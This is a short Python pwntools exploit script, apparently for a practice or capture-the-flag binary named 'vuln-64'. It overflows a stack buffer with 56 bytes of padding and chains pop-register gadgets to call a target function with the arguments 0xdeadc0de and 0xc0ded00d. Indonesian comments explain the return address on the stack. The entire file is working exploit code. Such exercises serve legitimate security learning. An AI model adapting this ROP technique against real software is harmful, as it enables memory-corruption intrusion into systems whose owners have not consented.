from pwn import *

p = process("./vuln-64")

junk = 56

addr = p64(0x000000000040116f)

param_1 = p64(0x00000000004011fb)
value1 = p64(0xdeadc0de)

param_2 = p64(0x00000000004011f9)
value2 = p64(0xc0ded00d)
r15 = p64(0x0)
return_addr_param = p64(0x0000000000401132) # p64(0x0) mau di isi 0 juga nggak apa sih, karena saat pemanggilan function jika function memiliki 2 param maka sebenarnya ada 3 param dengan param pertama yang berisi return address ( perintah setelah func itu di panggil ), jika param 1 maka sebenarnya ada 2


payload = b"A" * junk + param_1 + value1 + param_2 + value2 + r15 + addr + return_addr_param # jangan lupa untuk masukkan ret address jika mau, karena ret address selalu di stack
write("payload",payload)

p.sendline(payload)

print(p.recvall())